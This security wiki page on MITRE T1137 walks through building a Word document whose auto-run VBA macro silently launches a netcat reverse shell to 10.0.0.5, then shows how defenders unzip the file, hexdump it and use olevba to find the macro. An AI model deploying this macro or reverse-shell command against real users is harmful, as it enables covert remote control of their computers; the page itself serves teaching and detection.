---
description: Code execution with VBA Macros
---

# T1137: Phishing - Office Macros

This technique will build a primitive word document that will auto execute the VBA Macros code once the Macros protection is disabled.

### Weaponization

1. Create new word document (CTRL+N)
2. Hit ALT+F11 to go into Macro editor
3. Double click into the "This document" and CTRL+C/V the below:

{% code title="macro" %}
```javascript
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```
{% endcode %}

{% code title="C:\tools\shell.cmd" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```
{% endcode %}

This is how it should look roughly in:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgLyzzg4s-qdg2dwI7%2F-LIgPQNRLaMXc3DpUP4X%2Fmacros-code.png?alt=media\&token=7f44d9d6-1fc7-4d58-8b95-e7cfdd0a49fb)

ALT+F11 to switch back to the document editing mode and add a flair of social engineering like so:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgLyzzg4s-qdg2dwI7%2F-LIgPqjDNeExtA1WGgnU%2Fmacros-body.png?alt=media\&token=0c68270e-1177-4614-96bd-4ff804f85071)

Save the file as a macro enabled document, for example a Doc3.dotm:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgLyzzg4s-qdg2dwI7%2F-LIgQnqjf8Sm1htUDKpJ%2Fmacros-filename.png?alt=media\&token=5e28e88c-2ef2-423d-a76f-c7d7b8d1d831)

### Execution

Victim launching the Doc3.dotm:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgRcfkT_ObB4CHMxbK%2F-LIgRv4H3uSymKtI-jFD%2Fmacro-victim.png?alt=media\&token=dec18391-67f7-421e-b9f4-af3d25611794)

...and enabling the content - which results in attacker receiving a reverse shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgRcfkT_ObB4CHMxbK%2F-LIgSRtAicNbpqdX4uJB%2Fmacro-shell.png?alt=media\&token=c0b01eb6-5007-4d0c-b67b-49372c88f5df)

### Observations

The below graphic represents the process ancestry after the victim had clicked the "Enable Content" button in our malicious Doc3.dotm document:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgLyzzg4s-qdg2dwI7%2F-LIgRVT9xNepD8ZzZAMQ%2Fmacro-ancestry.png?alt=media\&token=3be9afae-284c-45e9-ab6e-dcbddbce3780)

### Inspection

If you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access to a WinZip or 7Zip and Strings utility or any type of Hex Editor to hand.

Since Office files are essentially ZIP archives (PK magic bytes):

```bash
root@remnux:/home/remnux# hexdump -C Doc3.dotm | head -n1
00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 cc 3c  |PK..........!..<|
```

...the file Dot3.dotm can be renamed to **Doc3.zip** and simply unzipped like a regular ZIP archive. Doing so deflates the archive and reveals the files that make up the malicious office document. One of the files is the `document.xml` which is where the main document body text goes and `vbaProject.bin` containing the evil macros themselves:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgRcfkT_ObB4CHMxbK%2F-LIgclLBiiK0f9mpubkF%2Fmacros-deflated.png?alt=media\&token=a99368f8-1284-4958-bed9-ab6ec390cd15)

Looking inside the `document.xml`, we can see the body copy we inputted at the very begging of this page in the Weaponization section:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgRcfkT_ObB4CHMxbK%2F-LIgczRGILGd6SJs7B19%2Fmacros-document-unzipped.png?alt=media\&token=9a1fb686-76d6-4b1c-b05b-444109bf4544)

Additionally, if you have the strings or a hex dumping utility, you can pass the `vbaProject.bin` through it. This can sometimes give you as defender enough to determine if the document is suspicious/malicious.

Running `hexdump -C vbaProject.bin` reveals some fragmented keywords that should immediately raise your suspicion - **Shell, Hide, Sub\_Open** and something that looks like a file path:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgRcfkT_ObB4CHMxbK%2F-LIgf-qO1mmU0Yc3pTyw%2Fmacros-hex-shell.png?alt=media\&token=3c6fff1e-4f8e-4b17-b4e6-aab793268570)

If you have a malware analysis linux distro Remnux, you can easily inspect the VBA macros code contained in the document by issuing the command `olevba.py filename.dotm`. As seen below, the command nicely decodes the `vbaProject.bin` and reveals the actual code as well as provides some interpretation of the commands found in the script:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIgRcfkT_ObB4CHMxbK%2F-LIgd5GpqjkpIS7VMnlq%2Fmacros-olevba.png?alt=media\&token=c6fb6bf7-b9ba-4bd3-956c-d1a37bb962bd)

{% hint style="danger" %}
Note that the olevba can be fooled as per [http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen](http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen)
{% endhint %}

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1137" %}
